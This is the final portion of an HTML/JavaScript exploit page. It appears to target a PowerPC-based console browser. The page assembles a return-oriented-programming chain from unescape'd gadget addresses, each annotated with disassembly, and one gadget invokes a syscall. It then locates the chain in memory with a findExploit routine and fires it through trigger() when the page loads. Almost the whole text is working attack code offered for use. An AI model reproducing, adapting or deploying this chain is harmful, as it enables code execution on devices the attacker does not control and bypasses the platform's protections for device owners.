		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");//set r30
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");//set r31
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");// padding
		
		
		// setup gadget #9
		
		/*
		000C0EB0 E8410028 ld         r2,0x28(r1) <-- fixes r2
		000C0EB4 E8010090 ld         r0,0x90(r1)
		000C0EB8 EBE10078 ld         r31,0x78(r1) <-- safely stores past the saved IDPS
		000C0EBC 38210080 addi       r1,r1,0x80
		000C0EC0 7C0803A6 mtspr      lr,r0
		000C0EC4 4E800020 blr 
		*/
		
		// 000AF96C E80100C0 ld         r0,0xC0(r1)
		gadget =  gadget+unescape("\u0000\u0000\u000C\u0EB0");// return address from r1 into r0
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4142\u4141\u4141\u4141");
		
		
		
		// prepare for gadget #10
		
		// 000C0EB0 E8410028 ld         r2,0x28(r1)
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0020");// set r2
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4144\u4141\u4141\u4141\u4141\u4141\u4145\u4141\u4141\u4141\u4146\u4141\u4531\u4141\u4141\u414A\u4391\u4141\u4141\u4141\u4141\u4148\u4141\u4141\u43B1\u4141\u4141\u414B\u4141\u4331\u4141\u4141\u4141");
		
		// 000C0EB8 EBE10078 ld         r31,0x78(r1)
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// set r31
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u414C\u4141\u4231\u4141\u4141\u4141");
		
		
		
		// setup gadget #10
		// make syscall
		/*
		0043436C 44000002 sc
		00434370 E8010090 ld         r0,0x90(r1)
		00434374 EBE10078 ld         r31,0x78(r1)
		00434378 38210080 addi       r1,r1,0x80
		0043437C 7C0803A6 mtspr      lr,r0
		00434380 4E800020 blr 
		*/
		
		// 000C0EB4 E8010090 ld         r0,0x90(r1)
		gadget =  gadget+unescape("\u0000\u0000\u0043\u436C");// return address from r1 into r0
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u41AB\u4141\u5141\u4141\u4141\u41A3\u4141\u4141\u4241\u4141\u41A4\u4141\u9191\u4141\u4141\u41A5\u4141\u4341\u4141\u4141\u41B5\u4141\u4141\u4541\u4141");
		
		
		
		// prepare for gadget #11
		
		// padding
		gadget =  gadget+unescape("\u4141\u41C6\u4141\u4141\u4141\u41B6\u4141\u4995\u4141\u4141\u6969\u4141\u4941\u4641\u4541\u4441\u4341\u4241\u4141\u4141\u4969");
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// set r31
		gadget =  gadget+unescape("\u6949\u4141\u8951\u4141\u4141\u5969\u4141\u4141");// padding
		
		
		// setup gadget #11
		/*
		
		*/
		
		// return from syscall
		// go back to gadget #7 [006161B8] to start fixing registers again
		gadget =  gadget+unescape("\u0000\u0000\u0061\u61B8");// return address from r1 into r0
		
		// padding
		gadget =  gadget+unescape("\u4141\u6141\u4141\u4969\u4141\u4111\u4141\u4141\u8649\u4141\u9141\u4941\u4141\u8549\u4B49\u4141\u4841\u4141\u8449\u4141\u4881\u4141\u4661\u8B49\u4141\u4941\u4461\u4141\u8B4B\u4141\u4381\u4141\u4141\u8B4C\u4141\u4443\u4949\u4141\u8B4D\u4141\u4141\u4843\u4141\u8D4D\u4141\u4141");
		
		
		
		// prepare for gadget #12
		gadget =  gadget+unescape("\u8FD8\uD550");// set r11
		gadget =  gadget+unescape("\u8020\u0100");// set r10
		gadget =  gadget+unescape("\u8020\u0080");// set r8
		gadget =  gadget+unescape("\u8020\u0070");// set r7
		gadget =  gadget+unescape("\u8020\u0060");// set r6
		gadget =  gadget+unescape("\u8020\u0050");// set r5
		gadget =  gadget+unescape("\u8020\u0040");// set r4
		gadget =  gadget+unescape("\u8020\u0030");// set r3
		
		// padding
		gadget =  gadget+unescape("u4141\u8141\u4141\u4849\u4141\u93B1");
		
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0030");// set r29 sets r3 for next gadget
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// set r30
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// set r31
		gadget =  gadget+unescape("\uC1C3\u85C9\uC3C9\uC1C1");
		gadget =  gadget+unescape("\uC8C1\u51C1\u8CC9\uC1C1");
		
		
		
		// setup gadget #12
		/*
		000B8EB8 E80100A0 ld         r0,0xA0(r1)
		000B8EBC 7FA3EB78 mr         r3,r29
		000B8EC0 EBC10080 ld         r30,0x80(r1)
		000B8EC4 EBA10078 ld         r29,0x78(r1)                   PIPE
		000B8EC8 7C0803A6 mtspr      lr,r0
		000B8ECC EBE10088 ld         r31,0x88(r1)
		000B8ED0 38210090 addi       r1,r1,0x90
		000B8ED4 4E800020 blr 
		*/
		// go back to gadget #7 to reset registers
		gadget =  gadget+unescape("\u0000\u0000\u000B\u8EB8");// return address from r1 into r0
		
		// padding
		gadget =  gadget+unescape("\u4444\u4141\u4343\u4141\u83C3\uC1C1\uC381\u91C1\u42C1\u83CC\uC1C1\uC1C1\uC9C9\uC1C1\u83CD\uD1C1\uC1C1\uC8C3\uC1C1\u8DCD\uC1C1\uC1C1\u5191\uC1C1\u8DC3\u41C1\uC231\uC1C1\u81C1\u8CC3\uC1C1\uC1C1\uC3CC\uC191\u81C3\uC1C1\uC5C6\uC331\uC1C1\u81C1\uC141\uC8C9\u1111\u9331\u8111\u8113\u1111\u1111");
		
		
		
		// prepare for gadget #13
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0290");// set r29
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");//set r30
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");//set r31
		
		// padding
		gadget =  gadget+unescape("\u3333\u9333\u8333\u8333\u3333\u3333\u3333\u3393");
		
		
		// setup gadget #13
		/*
		0x3C1654C
		
		*/
		//gadget =  gadget+unescape("\u0000\u0000\uBABE\uCAFE");// return address from r1 into r0
		//gadget =  gadget+unescape("\u0000\u0000\u038C\uE1B4"); //graceful exit test #1
		//gadget =  gadget+unescape("\u0000\u0000\u03C1\u654C"); //graceful exit test #2
		gadget =  gadget+unescape("\u0000\u0000\u0009\u76BC"); //graceful exit test #3
		
		// padding
		gadget =  gadget+unescape("\u3333\u8333\u3343\u3839\u3333\u9333\u9991\u9999\u9999\u8999\u8999\u9999\u9999\u9999\u9999\u8999\u9999\u9596\u9999\u9999\u8999\u9949\u9899\u9999\u9999\u6333\u6661\u6666\u6666\u8666\u8666\u6666\u6666\u6666\u6666\u8666\u6666\u6566\u6666\u6666\u8666\u6646\u6866\u6666\u6666\u4333\u4441\u4444\u4444\u8444\u8444\u4444\u4444\u4444\u4444\u8444\u4444\u4544\u4444\u4444\u0000\u0000\u038C\uE1B4\u4444");
		
		
		
		// prepare for gadget #14
		
		
		
		
		
		// setup gadget #14
		/*
		
		*/
		
		
		// padding + find marker NEW
		gadget =  gadget+unescape("\u4141\u4141\u696A\u696B\u4141\u4141\u7E2A");//200 bytes [old]
		
		
		
		// CEX
		//gadget =  unescape("\u4444\u0009\u7604\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0202\u0202\u0202\u0202\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u3030\u3030\u3030\u3030\u3131\u3131\u01F1\u3131\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000"); // 164 total bytes after placeholder & 24 bytes after 0xA0 r1 jump
		//gadget =  gadget+unescape("\u01c5\u324C\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1414\u1414\u1414\u1414\u1515\u1515\u1515\u1515\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1818\u1818\u1818\u1818\u1919\u1919\u1919\u1919\u2020\u2020\u2020\u2020\u2121\u2121\u2121\u2121\u2222\u2222\u2222\u2222\u2323\u2323");//200 bytes
		//gadget =  gadget+unescape("\u2323\u2323\u2424\u2424\u2424\u2424\u2525\u2525\u2525\u2525\u2626\u2626\u2626\u2626\u2727\u2727\u2727\u2727\u2828\u2828\u2828\u2828\u0000\u0000\u0001\u0000\u3030\u3030\u3030\u3030\u0000\u0000\u8060\u0000\u01F2\u4141\u4141\u4141\u1212\u1212\u4141\u4141\u0000\u0000\u0056\u8C94\u4141\u4141\u4141\u4141");//100 bytes & 32 bytes after r1 2nd jump
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0001\u4660\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u1000\u0404\u0404\u0001\u0000\u0909\u0909\u4141"); //122 bytes
		//gadget =  gadget+unescape("\u01F3\u4141\u4141\u4141\u4141\u4141\u4141\u2929\u2929\u2929\u2929\u3030\u3030\u3030\u3030\u4141\u4141\u4141\u4141\u01F4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u4660\u4141\4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");//92 bytes
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u7E2A");//200 bytes

		gadget = gadget.replaceAt(287, hexh2bin((payload_addr) >> 16));
		gadget = gadget.replaceAt(288, hexh2bin(payload_addr));
		
		
		dbg("Processing gadget string.. Searching for valid offset....");
		do{
		g = gadget.replaceAt(0x00/2,hexh2bin(0x7E2A));
		gadget_addr = findExploit("gadget",g,0x7E2A,0x1B8);
		}
		while(gadget_addr==0);
		
		dbg("Processing jump_2 string.. Searching for valid offset....");
		jump_2 = unescape("\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4444\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u2A2F");
		jump_2 = jump_2.replaceAt(0x32/2, hexh2bin((gadget_addr) >> 16));
		jump_2 = jump_2.replaceAt(0x34/2, hexh2bin(gadget_addr));	
		do{
		j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x2A2F));
		jump_2_addr = findExploit("j2",j2,0x2A2F,0x1C);
		}
		while(jump_2_addr==0);
		
		dbg("Processing jump_1 string.. Searching for valid offset....");
		jump_1 = unescape("\u4141\u4141\u4141\u7E2F");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));	
		do{

		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		jump_1_addr = findExploit("j1",j1,0x7E2F,0x4);
		}
		while(jump_1_addr==0);
		
		dbg("All required offsets have been found....");
		dbg("payload: "+a2hex(payload));
		dbg("payload variable offset: "+payload_addr.toString(16));
		dbg("gadget: "+a2hex(g));
		dbg("gadget variable offset: "+gadget_addr.toString(16));
		dbg("gadget: "+a2hex(j2));
		dbg("jump_2 variable offset: "+jump_2_addr.toString(16));
		dbg("gadget: "+a2hex(j1));
		dbg("jump_1 variable offset: "+jump_1_addr.toString(16));	
		dbg("Triggering exploit....");
		//alert("payload offset: "+payload_addr.toString(16) + "\ngadget offset: "+gadget_addr.toString(16) + "\njump_2 offset: "+jump_2_addr.toString(16) + "\njump_1 offset: "+jump_1_addr.toString(16));
		trigger(jump_1_addr);		
		alert("FIND_ME_TO_WRITE_OUTPUT_TO_ALERT");
		return;
	} catch(e) {
		dbg(e);
	}
}
</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears without further log below, refresh the page because the exploit failed!<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html>
